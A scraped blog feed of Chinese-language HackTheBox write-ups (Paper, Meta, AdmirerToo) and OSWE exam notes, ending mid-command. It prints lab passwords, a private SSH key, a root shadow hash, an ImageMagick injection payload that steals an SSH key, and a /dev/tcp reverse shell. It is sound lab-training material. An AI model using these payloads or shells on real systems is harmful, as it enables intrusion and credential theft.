Bloghttps://blog.ovhcloud.com/cve-2017-9841-what-is-it-and-how-do-we-protect-our-customers/ Undetected - discussion | RaidForumshttps://raidforums.com/Thread-Tutorial-Undetected-discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Paper - HackTheBox","slug":"Paper-HackTheBox","date":"2022-02-15T07:39:50.000Z","updated":"2022-06-20T04:55:56.208Z","comments":true,"path":"2022/02/15/Paper-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/02/15/Paper-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/432 10.10.11.143 端口扫描22,80,443: 123456789101112131415161718192021222324252627282930313233$ nmap -sC -sV 10.10.11.143Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-08 09:54 CSTNmap scan report for 10.10.11.143Host is up (0.19s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.0 (protocol 2.0)| ssh-hostkey:| 2048 10:05:ea:50:56:a6:00:cb:1c:9c:93:df:5f:83:e0:64 (RSA)| 256 58:8c:82:1c:c6:63:2a:83:87:5c:2f:2b:4f:4d:c3:79 (ECDSA)|_ 256 31:78:af:d1:3b:c4:2e:9d:60:4e:eb:5d:03:ec:a0:22 (ED25519)80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)|_http-title: HTTP Server Test Page powered by CentOS|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9| http-methods:|_ Potentially risky methods: TRACE443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9)| tls-alpn:|_ http/1.1|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9|_http-title: 400 Bad Request| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=Unspecified/countryName=US| Subject Alternative Name: DNS:localhost.localdomain| Not valid before: 2021-07-03T08:52:34|_Not valid after: 2022-07-08T10:32:34|_ssl-date: TLS randomness does not represent time| http-methods:|_ Potentially risky methods: TRACE|_http-generator: HTML Tidy for HTML5 for Linux version 5.7.28Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 71.91 seconds 80/443默认页面： 响应中得到域名： office.paper加hosts后访问： office.paperwordpress 5.2.3，其中一个comment中提示信息： draft无法直接查看，但可以搜到相关漏洞： WordPress &lt;= 5.2.3 - Unauthenticated View Private/Draft Posts WordPress Security Vulnerabilityhttps://wpscan.com/vulnerability/9909 得到Secret Registration URL： 1http:&#x2F;&#x2F;chat.office.paper&#x2F;register&#x2F;8qozr226AhkCHZdyY chat.office.paper同样添加hosts后访问，是rocket.chat： 使用secret url注册登录： recyclops bot频道里有个机器人，可以执行一些命令： 频道是只读的，但可以和机器人私聊： list file可以使用list查看目录，file查看文件，并且存在目录遍历： ../hubot/.envenv文件中得到密码： 12export ROCKETCHAT_USER&#x3D;recyclopsexport ROCKETCHAT_PASSWORD&#x3D;Queenofblad3s!23 username/etc/passwd文件和home目录确认用户名： user flagdwight ssh密码就是bot密码，得到user.txt 12ssh dwight@office.paperQueenofblad3s!23 提权信息linpeas发现CVE-2021-3560： Almorabea/Polkit-exploit: Privilege escalation with polkit - CVE-2021-3560https://github.com/Almorabea/Polkit-exploit 提权 &amp; root flagexp一键打： 12[root@paper ~]# cat &#x2F;etc&#x2F;shadowroot:$6$rfCS6Tb3sgIjkTux$UhBHq5wWPncgtVnltzm3Squ9KBcX3&#x2F;9k0y6o8AG6lNSKOobHatUWFzPS1J8uuh&#x2F;QML6kyhZ10ngXa5nCBLDkL.:18811:0:99999:7::: 参考资料 WordPress &lt;= 5.2.3 - Unauthenticated View Private/Draft Posts WordPress Security Vulnerabilityhttps://wpscan.com/vulnerability/9909 Almorabea/Polkit-exploit: Privilege escalation with polkit - CVE-2021-3560https://github.com/Almorabea/Polkit-exploit HTB Paper Writeup | 0xDedinfosec Bloghttps://0xdedinfosec.vercel.app/posts/hackthebox-paper-writeup Paper - Discussion [easy] | RaidForumshttps://raidforums.com/Thread-Tutorial-Paper-Discussion-easy","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"OSWE受験記","slug":"OSWE受験記","date":"2022-02-07T09:50:36.000Z","updated":"2022-02-08T06:09:00.124Z","comments":true,"path":"2022/02/07/OSWE受験記/","link":"","permalink":"https://darkwing.moe/2022/02/07/OSWE%E5%8F%97%E9%A8%93%E8%A8%98/","excerpt":"","text":"喵喵喵准备主要准备就是教材和lab，以及lab里额外的那几套练习 pentesrerlab的code review basge https://pentesterlab.com/badges/codereview 以及BurpSuite官方学院练习全做完 Dashboard | Web Security Academy - PortSwiggerhttps://portswigger.net/web-security/dashboard 参考资源里那些也都大概看过 考试就是时间记录里那样 考试给了5台机器，2台考试目标机，两台对应的调试机，一台kali 因为网络问题，GUI远程连接调试机，进行VSCODE远程调试非常卡，所以就没调试，只是ssh连上去分析代码，测试 通读代码，理解完整的逻辑，漏洞点都是是在lab里接触过的(包括额外练习中的)，主要是发现它们，把不同的点组合起来，完成整个利用流程 手工利用成功后写exp都可以直接用burp插件帮助，测试exp可以在给的那台kali上跑，通信速度会很快 大概就这些 时间记录大概就是这样： 12345678910111213141516171819202122233号 14:00开始22:00 第一台auth bypass23:15 手工完成第一台exp.py todo4号 3:20 第二台auth bypass3:30 admin test success 睡觉睡到7点7:45 手工完成第二台exp todo17:15 完成两个exp，开始写报告19:00 v121:00 v2 提前结束考试5号11点开始写报告17:00 提交6号 17：00 收到通过邮件 burp插件burp里直接生成对应request代码，方便写exp，主要用python，但某些情况必须用Java来做的话，用copy2java也可以，需要安装一个第三方库 Copy As Python-Requests - PortSwiggerhttps://portswigger.net/bappstore/b324647b6efa4b6a8f346389730df160 TheKingOfDuck/Copy2Java: 一键生成Java代码的burp插件/Generate Java script for fuzzing in Burp。https://github.com/TheKingOfDuck/Copy2Java kevinsawicki/http-request: Java HTTP Request Libraryhttps://github.com/kevinsawicki/http-request 参考资源 All learning materials | Web Security Academy https://portswigger.net/web-security/all-materials PentesterLab: Learn Web App Pentesting! https://pentesterlab.com/exercises/codereview/course HTB 中 OSWE prep NetSecFocus Trophy Room https://bowneconsultingcontent.com/pub/EH/proj/ED105.htm TROUBLE-1/White-box-pentesting: This lab is created to demonstrate pass-the-hash, blind sql and SSTI vulnerabilities https://github.com/TROUBLE-1/White-box-pentesting softwaresecured/secure-code-review-checklist: A starter secure code review checklist https://github.com/softwaresecured/secure-code-review-checklist Bug Patterns - Find Security Bugs https://find-sec-bugs.github.io/bugs.htm timip/OSWE: OSWE Preparation https://github.com/timip/OSWE wetw0rk/AWAE-PREP: This repository will serve as the “master” repo containing all trainings and tutorials done in preperation for OSWE in conjunction with the AWAE course. This repo will likely contain custom code by me and various courses. https://github.com/wetw0rk/AWAE-PREP Home · rinku191/OSWE-prepration Wiki https://github.com/rinku191/OSWE-prepration/wiki w181496/Web-CTF-Cheatsheet: Web CTF CheatSheet 🐈 https://github.com/w181496/Web-CTF-Cheatsheet sql注入 PentesterLab: Learn Web App Pentesting! https://pentesterlab.com/exercises/from_sqli_to_shell_pg_edition/course Blind SQL Injection | OWASP https://owasp.org/www-community/attacks/Blind_SQL_Injection POSTGRESQL CODE EXECUTION: UDF REVISITED | by AFINE | Medium https://afinepl.medium.com/postgresql-code-execution-udf-revisited-3b08412f47c1 SQL Injection Double Uppercut :: How to Achieve Remote Code Execution Against PostgreSQL https://srcincite.io/blog/2020/06/26/sql-injection-double-uppercut-how-to-achieve-remote-code-execution-against-postgresql.html SQL Injection and Postgres - An adventure to eventual RCE https://pulsesecurity.co.nz/articles/postgres-sqli Exploiting PostgreSQL Restore - Blog https://jon-stewart.github.io/exploiting-postgresql-restore/ Authenticated Arbitrary Command Execution on PostgreSQL 9.3 &gt; Latest | by Greenwolf | Greenwolf Security | Medium https://medium.com/greenwolf-security/authenticated-arbitrary-command-execution-on-postgresql-9-3-latest-cd18945914d5 Taking SQL Injections further (Blind Second Order SQL Injection + TMHC CTF Shitter Writeup) - Web Hacking - 0x00sec - The Home of the Hacker https://0x00sec.org/t/taking-sql-injections-further-blind-second-order-sql-injection-tmhc-ctf-shitter-writeup/18122 Lord of SQLInjection https://los.rubiya.kr/ 21y4d/blindSQLi: A python based blind SQL injection exploitation script https://github.com/21y4d/blindSQLi SSTI DiogoMRSilva/websitesVulnerableToSSTI: Simple websites vulnerable to Server Side Template Injections(SSTI) https://github.com/DiogoMRSilva/websitesVulnerableToSSTI epinna/tplmap: Server-Side Template Injection and Code Injection Detection and Exploitation Tool https://github.com/epinna/tplmap XSS XSS Showcase http://bogus.jp/xsssample/ XSS Challenges (by yamagata21) - Stage #1 http://xss-quiz.int21h.jp/ Client XSS Exercises - DomGoat https://domgo.at/cxss/example Javascript for Pentesters https://www.pentesteracademy.com/course?id=11 反序列化 Deserialization - OWASP Cheat Sheet Series https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html OWASP TOP 10: Insecure Deserialization - Detectify Blog https://blog.detectify.com/2018/03/21/owasp-top-10-insecure-deserialization/ OWASP Top 10 in 2017: Insecure Deserialization Security Vulnerability Practical Overview | ImmuniWeb Security Blog https://www.immuniweb.com/blog/OWASP-insecure-deserialization.html JAVA ManageEngine Applications Manager Deserialization Unauthenticated RCE · Application Security Blog https://blog.jamesotten.com/post/applications-manager-rce/ Java Deserialization — From Discovery to Reverse Shell on Limited Environments | by Francesco Soncina (phra) | ABN AMRO — Red Team | Medium https://medium.com/abn-amro-red-team/java-deserialization-from-discovery-to-reverse-shell-on-limited-environments-2e7b4e14fbef Understanding &amp; practicing java deserialization exploits – DiabloHorn https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/ Understanding Java deserialization – Nytro Security https://nytrosecurity.com/2018/05/30/understanding-java-deserialization/ What Do WebLogic, WebSphere, JBoss, Jenkins, OpenNMS, and Your Application Have in Common? This Vulnerability. https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/ GrrrDog/Java-Deserialization-Cheat-Sheet: The cheat sheet about Java Deserialization vulnerabilities https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet .NET Ivan1ee/NET-Deserialize: 总结了十篇.Net反序列化文章，持续更新 https://github.com/Ivan1ee/NET-Deserialize DotNetNuke 任意代码执行漏洞 (CVE-2017-9822) 分析预警 https://paper.seebug.org/365/ How to exploit the DotNetNuke Cookie Deserialization - Pentest-Tools.com Blog https://pentest-tools.com/blog/exploit-dotnetnuke-cookie-deserialization/ ObjectDataProvider Class (System.Windows.Data) | Microsoft Docs https://docs.microsoft.com/en-us/dotnet/api/system.windows.data.objectdataprovider?view=netframework-4.8 Details of XML serialization | Microsoft Docs https://docs.microsoft.com/en-us/dotnet/standard/serialization/introducing-xml-serialization New .NET deserialization gadget for compact payload. When size matters | Micro Focus Community https://community.microfocus.com/cyberres/b/off-by-on-software-security-blog/posts/new-net-deserialization-gadget-for-compact-payload-when-size-matters Exploiting Deserialisation in ASP.NET via ViewState | Soroush Dalili (@irsdl) – سروش دلیلی https://soroush.secproject.com/blog/2019/04/exploiting-deserialisation-in-asp-net-via-viewstate/ slides_bh_pdf https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-Json-Attacks.pdf The Battle of C# to JSON Serializers in .NET Core 3 - Michael’s Coding Spot https://michaelscodingspot.com/the-battle-of-c-to-json-serializers-in-net-core-3/ BlueHat v17 || Dangerous Contents - Securing .Net Deserialization https://www.slideshare.net/MSbluehat/dangerous-contents-securing-net-deserialization Black Hat USA 2012 - Are You My Type? Breaking .net Sandboxes Through Serialization - YouTube https://www.youtube.com/watch?v=Xfbu-pQ1tIc&amp;ab_channel=BlackHat pwntester/ysoserial.net: Deserialization payload generator for a variety of .NET formatters https://github.com/pwntester/ysoserial.net Python Escalating Deserialization Attacks (Python) https://frichetten.com/blog/escalating-deserialization-attacks-python/ Nodejs Exploiting Node.js deserialization bug for Remote Code Execution | OpSecX https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ 命令注入 Artsploit: [demo.paypal.com] Node.js code injection (RCE) https://artsploit.blogspot.com/2016/08/pprce2.html Exploiting Node.js deserialization bug for Remote Code Execution | OpSecX https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/ Nodejs RCE and a simple reverse shell https://ibreak.software/2016/08/nodejs-rce-and-a-simple-reverse-shell/ TypeJuggling PHP Type Juggling. PHP has two comparisons loose (==, =!)… | by HacktheBoxWalkthroughs | Medium https://medium.com/@Q2hpY2tlblB3bnk/php-type-juggling-c34a10630b10 PHP Type Juggling Vulnerabilities | by Vickie Li | The Startup | Medium https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09 PHP: PHP type comparison tables - Manual https://www.php.net/manual/en/types.comparisons.php PHP Type Juggling Vulnerabilities, Netsparker - Paul’s Security Weekly #572 - YouTube https://www.youtube.com/watch?v=ASYuK01H3Po&amp;ab_channel=SecurityWeekly PHPMagicTricks-TypeJuggling.pdf https://owasp.org/www-pdf-archive/PHPMagicTricks-TypeJuggling.pdf Type Juggling Authentication Bypass Vulnerability in CMS Made Simple | Netsparker https://www.netsparker.com/blog/web-security/type-juggling-authentication-bypass-cms-made-simple/ Type Juggling and PHP Object Injection, and SQLi, Oh My! https://foxglovesecurity.com/2017/02/07/type-juggling-and-php-object-injection-and-sqli-oh-my/ Magic Hashes | NTT Application Security https://www.whitehatsec.com/blog/magic-hashes/ spaze/hashes: Magic hashes – PHP hash “collisions” https://github.com/spaze/hashes 文件上传 45074-file-upload-restrictions-bypass.pdf https://www.exploit-db.com/docs/english/45074-file-upload-restrictions-bypass.pdf hacking website by shell uploading http://www.securityidiots.com/Web-Pentest/hacking-website-by-shell-uploading.html Unrestricted File Upload | OWASP https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload File upload bypass - Hacker’s Grimoire https://vulp3cula.gitbook.io/hackers-grimoire/exploitation/web-application/file-upload-bypass 各种语言在线运行环境 Online PHP Editor | ブラウザでプログラミング・実行ができる「オンライン実行環境」| paiza.IOhttps://paiza.io/ja/projects/new PHP Sandbox, test PHP online, PHP tester https://sandbox.onlinephpfunctions.com/ SQL OnLine IDE https://sqliteonline.com/ regex101: build, test, and debug regex https://regex101.com/ 基于grep的漏洞发现 Don’t Underestimate Grep Based Code Scanning – Little Man In My Head https://littlemaninmyhead.wordpress.com/2019/08/04/dont-underestimate-grep-based-code-scanning/ dustyfresh/PHP-vulnerability-audit-cheatsheet: This will assist you in the finding of potentially vulnerable PHP code. Each type of grep command is categorized in the type of vulnerabilities you generally find with that function. https://github.com/dustyfresh/PHP-vulnerability-audit-cheatsheet wireghoul/graudit: grep rough audit - source code auditing tool https://github.com/wireghoul/graudit Bug Patterns - Find Security Bugs https://find-sec-bugs.github.io/bugs_ja.htm Using Grep + Regex (Regular Expressions) to Search Text in Linux | DigitalOcean https://www.digitalocean.com/community/tutorials/using-grep-regular-expressions-to-search-for-text-patterns-in-linux 调试相关调试.NET程序集 .NET Reflector Visual Studio Extension - Visual Studio Marketplace https://marketplace.visualstudio.com/items?itemName=vs-publisher-306627.NETReflectorVisualStudioExtension dnSpy/dnSpy: .NET debugger and assembly editor https://github.com/dnSpy/dnSpy Debug .NET Framework source - Visual Studio (Windows) | Microsoft Docs https://docs.microsoft.com/en-us/visualstudio/debugger/how-to-debug-dotnet-framework-source?view=vs-2019 How to debug your .NET applications and packages without the actual source | Dominique St-Amand https://www.domstamand.com/debugging-your-dotnet-applications-and-packages-howto/ 语言相关checklistnodejs Node.js Security Checklist - RisingStack Engineering https://blog.risingstack.com/node-js-security-checklist/ aadityapurani/NodeJS-Red-Team-Cheat-Sheet: NodeJS Red-Team Cheat Sheet https://github.com/aadityapurani/NodeJS-Red-Team-Cheat-Sheet jesusprubio/awesome-nodejs-pentest: Delightful Node.js packages useful for penetration testing, exploiting, reverse engineer, cryptography … https://github.com/jesusprubio/awesome-nodejs-pentest Secure Code Review and Penetration Testing of Node.js and JavaScript Apps | by Mostafa Moradian | The Startup | Medium https://medium.com/swlh/secure-code-review-and-penetration-testing-of-node-js-and-javascript-apps-41485b1a9518 https://github.com/carnal0wnage/exploits-1/blob/master/nodejsshell.py 参考资料 OSWE Review(受験記) - 高林の雑記ブログhttps://kakyouim.hatenablog.com/entry/2021/04/02/162147 OSWE Review (AWAE Course) - S7acktrac3https://stacktrac3.co/oswe-review-awae-course/ [CERT] OSWE Exam Review and Tips (ft. No Developer Background Candidate) | by bigb0ss | InfoSec Write-upshttps://infosecwriteups.com/cert-oswe-exam-review-and-tips-ft-no-developer-background-candidate-1dad7f545155","categories":[],"tags":[]},{"title":"Meta - HackTheBox","slug":"Meta-HackTheBox","date":"2022-01-29T07:53:52.000Z","updated":"2022-06-13T07:25:47.348Z","comments":true,"path":"2022/01/29/Meta-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/01/29/Meta-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/429 10.10.11.140 端口扫描22和80: 123456789101112131415161718$ nmap -sC -sV 10.10.11.140Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-29 14:02 CSTNmap scan report for 10.10.11.140Host is up (0.18s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:| 2048 12:81:17:5a:5a:c9:c6:00:db:f0:ed:93:64:fd:1e:08 (RSA)| 256 b5:e5:59:53:00:18:96:a6:f8:42:d8:c7:fb:13:20:49 (ECDSA)|_ 256 05:e9:df:71:b5:9f:25:03:6b:d0:46:8d:05:45:44:20 (ED25519)80/tcp open http Apache httpd|_http-title: Did not follow redirect to http://artcorp.htb|_http-server-header: ApacheService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 119.09 seconds 80加hosts后访问： 110.10.11.140 artcorp.htb 子域名子域名扫描可以发现一个dev01: 123gobuster vhost -u http://artcorp.htb/ -w ~/Tools/dict/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -k -t 50Found: dev01.artcorp.htb (Status: 200) [Size: 247] dev01.artcorp.htb同样加hosts后访问： MetaView是一个上传图片，解析元数据的在线工具，看起来就是调用的exiftool： CVE-2021-22204直接搜exiftool相关漏洞： https://github.com/convisolabs/CVE-2021-22204-exiftool 修改ip端口，生成恶意图片上传解析，得到www-data: 信息运行pspy64之类的可以发现thomas用户定时运行的一些文件： mogrifymogrify实际上是ImageMagick： 可以搜到相关漏洞： InsertScript: ImageMagick - Shell injection via PDF passwordhttps://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html ImageMagick测试可以以thomas身份执行命令： 1cp poc.svg &#x2F;var&#x2F;www&#x2F;dev01.artcorp.htb&#x2F;convert_images&#x2F; 修改命令读取ssh私钥,要修复一下格式： exp.svg123456789&lt;image authenticate='ff\" `echo $(cat ~/.ssh/id_rsa)&gt; /dev/shm/id_rsa`;\"'&gt; &lt;read filename=\"pdf:/etc/passwd\"/&gt; &lt;get width=\"base-width\" height=\"base-height\" /&gt; &lt;resize geometry=\"400x400\" /&gt; &lt;write filename=\"test.png\" /&gt; &lt;svg width=\"700\" height=\"700\" xmlns=\"http://www.w3.org/2000/svg\" xmlns:xlink=\"http://www.w3.org/1999/xlink\"&gt; &lt;image xlink:href=\"msl:poc.svg\" height=\"100\" width=\"100\"/&gt; &lt;/svg&gt;&lt;/image&gt; thomas_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEAt9IoI5gHtz8omhsaZ9Gy+wXyNZPp5jJZvbOJ946OI4g2kRRDHDm5x7up3z5s&#x2F;H&#x2F;yujgjgroOOHh9zBBuiZ1Jn1jlveRM7H1VLbtY8k&#x2F;rN9PFe&#x2F;MkRsYdH45IvVqMgzqmJPFAdxmkD9WRnVP9OqEF0ZEYwTFuFPUlNq5hSbNRucwXEXbW0Wk7xdXwe3OJk8huajeY80riz0S8+A+OywcXZg0HVFVli4&#x2F;fAvS9Im4VCRmEfA7jwCuh6tl5JMxfi30uzzvke0yvS1h9asqvkfY5+FX4D9BResbt9AXqm47ajWePksWBoUwhhENLN&#x2F;1pOgQanK2BR&#x2F;SC+YkPnXRkOavHBxHccusftItOQuS0AEza8nfE5ioJmX5O9+fv8ChmnapyryKKn4QR4MAqqTqNIb7xOWTT7Qmv3vw8TDZYz2dnlAOCc+ONWh8JJZHO9i8BXyHNwAH9qyESB7NlX2zJaAbIZgQsXkd7NTUnjOQosPTIDFSPD2EKLt2B1v3D&#x2F;2DMqtsnAAAFgOcGpkXnBqZFAAAAB3NzaC1yc2EAAAGBALfSKCOYB7c&#x2F;KJobGmfRsvsF8jWT6eYyWb2zifeOjiOINpEUQxw5uce7qd8+bPx&#x2F;8ro4I4K6Djh4fcwQbomdSZ9Y5b3kTOx9VS27WPJP6zfTxXvzJEbGHR+OSL1ajIM6piTxQHcZpA&#x2F;VkZ1T&#x2F;TqhBdGRGMExbhT1JTauYUmzUbnMFxF21tFpO8XV8HtziZPIbmo3mPNK4s9EvPgPjssHF2YNB1RVZYuP3wL0vSJuFQkZhHwO48AroerZeSTMX4t9Ls875HtMr0tYfWrKr5H2OfhV+A&#x2F;QUXrG7fQF6puO2o1nj5LFgaFMIYRDSzf9aToEGpytgUf0gvmJD510ZDmrxwcR3HLrH7SLTkLktABM2vJ3xOYqCZl+Tvfn7&#x2F;AoZp2qcq8iip+EEeDAKqk6jSG+8Tlk0+0Jr978PEw2WM9nZ5QDgnPjjVofCSWRzvYvAV8hzcAB&#x2F;ashEgezZV9syWgGyGYELF5HezU1J4zkKLD0yAxUjw9hCi7dgdb9w&#x2F;9gzKrbJwAAAAMBAAEAAAGAFlFwyCmMPkZv0o4Z3aMLPQkSyEiGLInOdYbX6HOpdEz0exbfswybLtHtJQq6RsnuGYf5X8ThNyAB&#x2F;gW8tf6f0rYDZtPSNyBceCn3+auUXnnaz1rM+77QCGXJFRxqVQCI7ZFRB2TYk4eVn2l0JGsqfrBENiifOfItq37ulvkroghSgK9SE6jYNgPsp8B2YrgCF+laK6fa89lfrCqPZr0crSpFyop3wsMcC4rVb9m3uhwcBsf0BQAHL7Fp0PrzWsc+9AA14ATK4DR&#x2F;g8JhwQOHzYEoe17iu7&#x2F;iL7gxDwdlpK7CPhYlL5Xj6bLPBGmRkszFdXLBPUrlKmWuwLUYoSx8sn3ZSny4jj8x0KoEgHqzKVh4hL0ccJWE8xWSsLk1&#x2F;G2x1FxU45+hhmmdG3eKzaRhZpc3hzYZXZC9ypjsFDAyG1ARC679vHnzTI13id29dGn7JoPVwFv&#x2F;97UYG2WKexo6DOMmbNuxaKkpetfsqsLAnqLf026UeD1PJYy46kvva1axAAAAwQCWMIdnyPjk55Mjz3&#x2F;AKUNBySvL5psWsLpx3DaWZ1XwH0uDzWqtMWOqYjenkyOrI1Y8ayJfYAm4xkSmOTuEIvcXi6xkS&#x2F;h67R&#x2F;GT38zFaGnCHh13&#x2F;zW0cZDnw5ZNbZ60VfueTcUn9Y38ZdWKtVUBsvb23Mu+wMyv87&#x2F;Ju+GPuXwUi6mOcMy+iOBoFCLYkKaLJzUFngOg7664dUagxI8qMpD6SQhkD8NWgcwU1DjFfUUdvRv5TnaOhmdNhH2jnr5HaUAAADBAN16q2wajrRH59vwo2PFddXTIGLZj3HXn9U5W84AIetwxMFs27zvnNYFTd8YqSwBQzXTniwId4KOEmx7rnECoTqmtSsqzxiKMLarkVJ+4aVELCRutaJPhpRC1nOL9HDKysDTlWNSr8fq2LiYwIku7caFosFMN54zxGRo5NwbYOAxgFhRJh9DTmhFHJxSnx&#x2F;6hiCWneRKpG4RCr80fFJMvbTod919eXD0GS1xsBQdieqiJ66NOalf6uQ6STRxu6A3bwAAAMEA1Hjetdy+Zf0xZTkqmnF4yODqpAIMG9Umj3Tcjs49usGlHbZb5yhySnucJU0vGpRiKBMqPeysaqGC47Ju&#x2F;qSlyHnUz2yRPu+kvjFw19keAmlMNeuMqgBO0guskmU25GX4O5Umt&#x2F;IHqFHw99mcTGc&#x2F;veEWIb8PUNV8p&#x2F;sNaWUckEu9M4ofDQ3csqhrNLlvA68QRPMaZ9bFgYjhB1A1pGxOmu9Do+LNu0qr2&#x2F;GBcCvYY2kI4GFINebhFErAeoncE3vJAAAACXJvb3RAbWV0YQE&#x3D;-----END OPENSSH PRIVATE KEY----- user flag 使用私钥登录thomas，得到user.txt: 提权信息可以sudo运行neofetch，只能使用指定参数，但注意，会保留XDG_CONFIG_HOME环境变量,另外当前用户的neofetch配置文件我们可控： 提权 &amp; root flag所以就可以通过配置文件写恶意命令： 1234567thomas@meta:~/.config/neofetch$ nano config.confthomas@meta:~/.config/neofetch$ head -n 1 config.confbash -c 'exec bash -i &amp;&gt;/dev/tcp/10.10.14.12/4444 &lt;&amp;1'thomas@meta:~/.config/neofetch$ export XDG_CONFIG_HOME=\"$HOME/.config\"thomas@meta:~/.config/neofetch$ echo $XDG_CONFIG_HOME/home/thomas/.configthomas@meta:~/.config/neofetch$ sudo /usr/bin/neofetch \\\"\\\" 参考资料 https://github.com/convisolabs/CVE-2021-22204-exiftool InsertScript: ImageMagick - Shell injection via PDF passwordhttps://insert-script.blogspot.com/2020/11/imagemagick-shell-injection-via-pdf.html HTB Meta [Discussion] | RaidForumshttps://raidforums.com/Thread-Tutorial-HTB-Meta-Discussion","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"AdmirerToo - HackTheBox","slug":"AdmirerToo-HackTheBox","date":"2022-01-28T08:49:57.000Z","updated":"2022-05-30T06:30:38.697Z","comments":true,"path":"2022/01/28/AdmirerToo-HackTheBox/","link":"","permalink":"https://darkwing.moe/2022/01/28/AdmirerToo-HackTheBox/","excerpt":"","text":"基本信息 https://www.hackthebox.com/home/machines/profile/427 10.10.11.137 端口扫描需要全端口扫描,本地扫非常慢，建议开pwnbox,并且注意扫描选项： 12345678910111213141516171819202122232425262728293031323334sudo nmap -p- -sF -v 10.10.11.137Nmap scan report for 10.10.11.137Host is up (0.0021s latency).Not shown: 65530 closed tcp ports (reset)PORT STATE SERVICE22/tcp open|filtered ssh80/tcp open|filtered http4242/tcp filtered vrml-multi-use16010/tcp open|filtered unknown16030/tcp open|filtered unknownsudo nmap -sC -sV -sF -p22,80,4242,16010,16030 10.10.11.137└──╼ [★]$ sudo nmap -sC -sV -sF -p22,80,4242,16010,16030 10.10.11.137Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-28 08:21 GMTNmap scan report for 10.10.11.137Host is up (0.0021s latency).PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey:| 2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)| 256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)|_ 256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)80/tcp open http Apache httpd 2.4.38 ((Debian))|_http-title: Admirer|_http-server-header: Apache/2.4.38 (Debian)4242/tcp filtered vrml-multi-use16010/tcp open|filtered tcpwrapped16030/tcp open|filtered tcpwrappedService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 8.14 seconds 80 子域名任意不存在的路径，404页面邮箱地址得到域名： 加入hosts后，扫描子域名,发现一个db： 1234510.10.11.137 admirer-gallery.htbgobuster vhost -u http://admirer-gallery.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50 -rFound: db.admirer-gallery.htb (Status: 200) [Size: 2569] db.admirer-gallery.htb加入hosts后访问： Adminer预设置账号密码，进去里面没什么有用信息： 123456&lt;input type=\"hidden\" name=\"auth[driver]\" value=\"server\"&gt; &lt;input type=\"hidden\" name=\"auth[server]\" value=\"localhost\"&gt; &lt;input type=\"hidden\" name=\"auth[username]\" value=\"admirer_ro\"&gt; &lt;input type=\"hidden\" name=\"auth[password]\" value=\"1w4nn4b3adm1r3d2!\"&gt; &lt;input type='hidden' name=\"auth[db]\" value=\"admirer\"/&gt; &lt;input type='hidden' SSRF可以搜到Adminer的SSRF SSRF in adminer · CVE-2021-21311 · GitHub Advisory Databasehttps://github.com/advisories/GHSA-x5r2-hj5c-8jx6 直接burp修改连接信息，会发现显示为4.8.1: SSRF to opentsdbAdminer可以使用其他driver，例如elestic，修改driver，使用脚本重定向，可以访问到4242端口的opentsdb： https://github.com/vrana/adminer/tree/master/adminer/drivers OpenTSDB getshellopentsdb存在已知漏洞，后面就是一步步打： OpenTSDB 2.4.0 Remote Code Execution · Issue #2051 · OpenTSDB/opentsdbhttps://github.com/OpenTSDB/opentsdb/issues/2051 123456789101112python redirect.py -i 10.10.14.10 --port 7777 